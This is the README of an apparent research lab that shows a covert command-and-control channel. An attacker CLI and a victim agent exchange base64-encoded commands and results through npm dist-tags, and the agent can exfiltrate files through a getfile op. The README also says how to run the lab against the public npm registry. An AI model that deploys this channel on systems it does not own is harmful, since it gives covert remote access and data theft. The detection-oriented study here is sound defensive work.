# npm-c2-lab — Indirect C2 over npm dist-tags

An **educational research lab** demonstrating an indirect command-and-control
(C2) architecture that uses **npm dist-tags as the communication mailbox**,
inspired by the npm-c2 research. Built for understanding C2 channel design and
**defender detection** — not for offensive use.

> **Scope / ethics**: the victim agent executes only hard-coded mock tasks
> (24 allowlisted ops — see `src/common/ops.js`: `echo`, `ping`, `time`,
> `sysinfo`, `whoami`, `env`, `netinfo`, `ps`, `df`, `pwd`, `cd`, `ls`,
> `stat`, `find`, `hash`, `getfile`, plus eight visible/audible `fun` ops).
> There is **no** arbitrary command
> execution, persistence, privilege escalation, obfuscation, or encryption.
> `getfile` reads a single file (absolute path, or relative to the agent's
> cwd) under a small size cap. Payloads are deliberately plain base64 so
> every artifact is readable and analyzable. The default registry is a
> **local** verdaccio container.
> Do not point this at packages or accounts you do not own.

## Architecture

```
                  npm Registry
             (dist-tags mailbox)
          ┌───────────────────────┐
          │  Package: my-package   │
          │                       │
          │ latest -> 1.0.0       │
          │ x-cmd-* -> command    │
          │ x-res-* -> result     │
          │ x-ann-* -> announce   │
          └───────────────────────┘
                 ▲           ▲
                 │           │
        HTTPS GET/PUT   HTTPS GET/PUT
                 │           │
          Attacker CLI    Victim Agent
```

The two sides never connect to each other. The attacker **writes** command
dist-tags; the victim **polls** the package's dist-tags, executes the mock
task, and **writes** result dist-tags back. All payloads travel in tag
**names** (tag values must be real versions, so they are pinned to `1.0.0`).
Package files are never modified after the initial publish.

Deep dives:

- [`docs/protocol.md`](docs/protocol.md) — tag grammar, encoding, chunking, sequencing, state machine
- [`docs/architecture.md`](docs/architecture.md) — components, why versions are immutable / dist-tags mutable, advantages & limitations
- [`docs/detection.md`](docs/detection.md) — defender's view: IoCs, behavioral detections, Splunk/Elastic/Sigma/YARA examples

## Requirements

- Node.js ≥ 20 (zero runtime npm dependencies — standard library only)
- Docker + Docker Compose (for the local registry environment)

## Quickstart (Docker — recommended)

Everything runs locally against a throwaway verdaccio registry:

```sh
# 1. Start the registry, seed it (creates user, publishes my-package@1.0.0),
#    and start the victim agent
docker compose -f docker/docker-compose.yml up -d registry setup victim

# 2. Open the interactive attacker CLI
docker compose -f docker/docker-compose.yml run --rm attacker
```

In the CLI:

```
npm-c2> task all ping              # broadcast a command
npm-c2> task all whoami            # report mock identity details
npm-c2> task all pwd               # where is the agent?
npm-c2> task all ls /tmp           # list a directory on the victim
npm-c2> task all getfile /etc/hosts  # fetch a file (absolute or cwd-relative)
npm-c2> agents                     # list agents (joins also print live)
npm-c2> history 10                 # last 10 requests/responses
npm-c2> stats                      # local counters
npm-c2> clean                      # delete all x-cmd-*/x-res-*/x-ann-* tags
npm-c2> exit
```

The CLI polls in the background while you type: agent joins and task
completions/failures print as live notifications — no `watch` needed.

Tear down:

```sh
docker compose -f docker/docker-compose.yml down -v
```

## Quickstart (local processes, no Docker)

You need any npm-compatible registry. Easiest is still verdaccio:

```sh
npx verdaccio &                                    # local registry on :4873
sh docker/setup-registry.sh                        # seeds user + package, writes token to /shared/token
export NPM_C2_TOKEN="$(cat /shared/token)"         # or wherever SHARED_DIR pointed

cp config.example.json config.json                 # adjust if needed
npm run victim                                     # terminal 1: start agent
npm run attacker                                   # terminal 2: start CLI
```

## Using the real npmjs.org registry (optional, with warnings)

The same code works against the real registry — that is the point of the
research. If you do this:

- use a **throwaway package you own** (publish `1.0.0` once, e.g. scoped under
  your own user: `@youruser/c2-lab-test`);
- use a **granular access token** limited to that package, exported as
  `NPM_C2_TOKEN`;
- expect rate limits and abuse monitoring — high-frequency tag churn on one
  package is exactly the anomaly described in `docs/detection.md`;
- remember that dist-tags on a public package are **world-readable**: anyone
  can see your commands and results.

Set `registryUrl: "https://registry.npmjs.org"` and your `packageName` in
`config.json` — or better, put everything including the token in `env.sh`
(see below), which keeps secrets out of config files entirely.

## Configuration

Copy `config.example.json` to `config.json` (both sides read it), or override
with environment variables.

**Recommended: `env.sh`.** Both sides auto-load an `env.sh` file in the
project root at startup (`KEY=VALUE` or `export KEY=VALUE` lines). It is
git-ignored and is the intended place for the token — no pasting secrets
into your shell history, and both `npm run victim` and `npm run attacker`
pick it up no matter which terminal they run in:

```sh
cp env.sh.example env.sh   # then edit env.sh and fill in your values
```

Real environment variables always win over `env.sh` values. Use
`NPM_C2_ENV_FILE=/path/to/file` to load a different file.

| Key / env var | Meaning | Default |
|---|---|---|
| `registryUrl` / `NPM_C2_REGISTRY_URL` | registry base URL | `http://localhost:4873` |
| `packageName` / `NPM_C2_PACKAGE_NAME` | mailbox package | `my-package` |
| `pollIntervalSec` / `NPM_C2_POLL_INTERVAL` | victim poll interval | `10` |
| `agentId` / `NPM_C2_AGENT_ID` | victim id (generated + persisted if empty) | `""` |
| `logFile` / `NPM_C2_LOG_FILE` | append-only log file (`""` disables) | `logs/lab.log` |
| `stateFile` / `NPM_C2_STATE_FILE` | state file path (role default if empty) | `""` |
| `maxFileBytes` / `NPM_C2_MAX_FILE_BYTES` | max bytes returned by `getfile` | `32768` |
| — / `NPM_C2_TOKEN` | registry bearer token (**env / `env.sh` only, never `config.json`**) | — |
| — / `NPM_C2_ENV_FILE` | explicit env.sh path | `./env.sh` |
| — / `NPM_C2_CONFIG` | explicit config file path | `./config.json` |
| — / `NPM_C2_LOG_LEVEL` | `debug`/`info`/`warn`/`error` | `info` |

State files: `victim-state.json` (agent id + last processed seq per target),
`attacker-state.json` (next seq per target, seen results, agent info, request/
response history, stats). Delete them to reset a side.

## Attacker CLI reference

| Command | Description |
|---|---|
| `agents` | list agents seen, with last-seen time, host, and cwd |
| `task <agentId\|all> <op> [args...]` | publish a command tag |
| `history [n]` | show the last n requests/responses (default 20, persisted) |
| `poll` | fetch & decode new result tags once |
| `clean` | delete all `x-cmd-*`/`x-res-*`/`x-ann-*` tags (leaves only `latest`) |
| `stats` | local counters: sent, received, per-agent |
| `help`, `exit` | — |

Ops without arguments: `echo <text>`, `ping`, `time`, `sysinfo`, `whoami`,
`env` (secrets redacted), `netinfo`, `ps`, `df`, `pwd`. Ops
taking a path: `cd`, `stat`, `hash`, `getfile` — the path is **absolute, or
relative to the agent's current working directory** (use `pwd` to see it and
`cd` to change it). `ls [path]` lists a directory (default: the agent's cwd)
and `find <dir> <text>` searches file names recursively. The allowlist is
data-driven: `src/common/ops.js` holds each op's name, usage, argument spec,
and help summary — adding an op is one entry there plus one handler under
`src/victim/`.

Fun ops are shown in their own CLI help section: `openurl <http(s)-url>`,
`say <text>`, `notify <text>`, `beep`, `bounce`, `volume <0-100>`, `rickroll`,
and `party`. They use built-in macOS/Windows facilities and common Linux
desktop utilities. Minimal/headless Linux systems report a clear error when
the required browser, speech, notification, or audio utility is unavailable.

While the prompt is idle, the CLI polls in the background (every
`min(pollIntervalSec, 5)`s) and prints live notifications when an agent
joins (`x-ann-*` announce tag published by the victim at startup) and when a
task completes or fails.

`getfile` transfers bytes, so small images and short video samples work the
same way as text files. The attacker saves reassembled downloads under
`downloads/`.

## Development

```sh
npm test          # node:test unit suite (protocol, registry client, agent)
```

Project layout:

```
src/common/    protocol.js (codec) · ops.js (task allowlist metadata) · registry.js (HTTP client) · config.js · logger.js
src/victim/    agent.js (poll loop) · tasks.js (core handlers) · fun.js (desktop handlers)
src/attacker/  cli.js (REPL)
tests/         node:test unit tests
docker/        Dockerfile · docker-compose.yml · setup-registry.sh · entrypoint.sh
docs/          protocol.md · architecture.md · detection.md
```

## License

MIT — for educational and defensive-security use only.
